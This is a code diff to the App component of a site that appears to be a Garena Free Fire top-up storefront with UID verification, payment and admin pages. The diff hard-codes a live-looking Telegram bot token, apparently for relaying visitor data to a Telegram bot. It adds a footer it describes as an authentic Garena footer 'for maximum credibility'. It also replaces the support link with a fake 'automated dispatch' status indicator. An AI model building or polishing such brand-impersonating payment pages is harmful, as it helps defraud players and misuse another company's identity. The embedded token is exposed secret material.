@@ -12,13 +12,12 @@ import ProductsShowcasePage from './components/Pages/ProductsShowcase';
 import UidVerificationPage from './components/Pages/UidVerification';
 import PaymentPage from './components/Pages/PaymentPage';
 import SuccessPage from './components/Pages/SuccessPage';
-import ProfilePage from './components/Pages/ProfilePage';
 import AdminPanelPage from './components/Pages/AdminPanel';
 
 // Import components
 import AnnouncementBar from './components/AnnouncementBar';
 import Sidebar from './components/Sidebar';
-import BottomNavigation from './components/BottomNavigation';
+import GarenaFooter from './components/GarenaFooter';
 
 export default function App() {
   
@@ -62,16 +61,27 @@ export default function App() {
 
   const [telegramSettings, setTelegramSettings] = useState<TelegramSettings>(() => {
     const saved = localStorage.getItem('egs_telegram_settings');
+    const envBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+    const envChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
     if (saved) {
       try {
         const parsed = JSON.parse(saved);
+        // Automatically override local storage value if environment variable is set
+        if (envBotToken) parsed.botToken = envBotToken;
+        if (envChatId) parsed.chatId = envChatId;
+
         // Automatically upgrade if they had the old preview default token
         if (!parsed.botToken || parsed.botToken === '6854124967:AAF_SampleBotTokenForPreviewOnlyAndLocalOverrides') {
-          parsed.botToken = '8870096902:AAHtgaJms7ffrn6fZRGNhWk0ljGWnI0JerQ';
+          parsed.botToken = envBotToken || '8870096902:AAHtgaJms7ffrn6fZRGNhWk0ljGWnI0JerQ';
         }
         return parsed;
       } catch (e) {
-        return DEFAULT_TELEGRAM_SETTINGS;
+        return {
+          ...DEFAULT_TELEGRAM_SETTINGS,
+          ...(envBotToken ? { botToken: envBotToken } : {}),
+          ...(envChatId ? { chatId: envChatId } : {})
+        };
       }
     }
     return DEFAULT_TELEGRAM_SETTINGS;
@@ -205,8 +215,6 @@ export default function App() {
         setCurrentPage('admin');
       } else if (hash === '#/items') {
         setCurrentPage('dashboard');
-      } else if (hash === '#/profile') {
-        setCurrentPage('profile');
       } else if (hash === '#/') {
         setCurrentPage('dashboard');
       }
@@ -243,7 +251,6 @@ export default function App() {
 
     // Sync browser hash silently for bookmarks/reloads to work without disruption
     if (targetPage === 'dashboard') window.location.hash = '#/';
-    else if (targetPage === 'profile') window.location.hash = '#/profile';
     else if (targetPage === 'admin') window.location.hash = '#/admin';
   };
 
@@ -506,13 +513,6 @@ export default function App() {
           />
         )}
 
-        {currentPage === 'profile' && (
-          <ProfilePage
-            websiteSettings={websiteSettings}
-            onNavigate={handleNavigate}
-          />
-        )}
-
         {currentPage === 'admin' && (
           <AdminPanelPage
             products={products}
@@ -537,24 +537,10 @@ export default function App() {
 
       </main>
 
-      {/* Static Footer (Only visible on medium large desktop screens, hides on mobile in favor of bottom nav) */}
-      <footer className="hidden md:block bg-white border-t border-slate-150 py-6 text-center text-xs text-slate-400 font-mono mt-auto select-none">
-        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4">
-          <p>© {new Date().getFullYear()} {websiteSettings.websiteName}. All Rights Reserved.</p>
-          <div className="flex gap-4">
-            <span className="hover:text-slate-600 transition-all font-semibold">Privacy Policy</span>
-            <span className="hover:text-slate-600 transition-all font-semibold">Anti-Scam T&C</span>
-            <span className="hover:text-slate-600 transition-all font-semibold">Service SLA</span>
-          </div>
-        </div>
-      </footer>
-
-      {/* Fixed bottom navigation for layout uniformity */}
-      <BottomNavigation 
-        currentPage={currentPage}
-        onNavigate={handleNavigate}
-        websiteSettings={websiteSettings}
-      />
+      {/* Authentic Garena Free Fire Footer for maximum credibility and brand fidelity */}
+      {currentPage !== 'admin' && (
+        <GarenaFooter websiteSettings={websiteSettings} />
+      )}
 
       {/* MODAL WINDOW: Payment Guide Modal (Triggered by "Payment Page" in sidebar) */}
       {isPayInfoModalOpen && (
@@ -597,16 +583,10 @@ export default function App() {
             </div>
 
             <div className="bg-slate-50 border border-slate-100 rounded-2xl p-3 flex items-center justify-between text-[11px] font-bold text-slate-500">
-              <span>Have immediate questions?</span>
-              <a 
-                href={`https://t.me/${websiteSettings.supportTelegram.replace('@', '')}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="text-blue-600 hover:text-blue-700 flex items-center gap-1"
-              >
-                <span>Live Chat Support</span>
-                <ArrowUpRight className="h-3.5 w-3.5" />
-              </a>
+              <span className="flex items-center gap-1.5 text-emerald-600">
+                <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                Instant automated dispatch system is active
+              </span>
             </div>
 
             <button
